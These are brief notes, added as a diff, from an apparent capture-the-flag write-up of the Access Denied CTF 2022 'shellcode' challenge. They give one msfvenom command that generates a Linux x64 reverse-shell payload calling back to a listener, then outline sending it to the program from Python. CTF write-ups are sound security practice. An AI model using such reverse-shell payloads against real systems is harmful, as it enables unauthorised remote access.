@@ -1,0 +1,13 @@
+## Access Denied CTF 2022 - shellcode
+
+running the program says it accepts shellcode
+
+$ msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=12345 -b "\x00\x0a" -f c
+
+generate shellcode in c
+
+copy into python script
+
+send as bytes
+
+"omitted bytes" not necessary in shellcode generation..
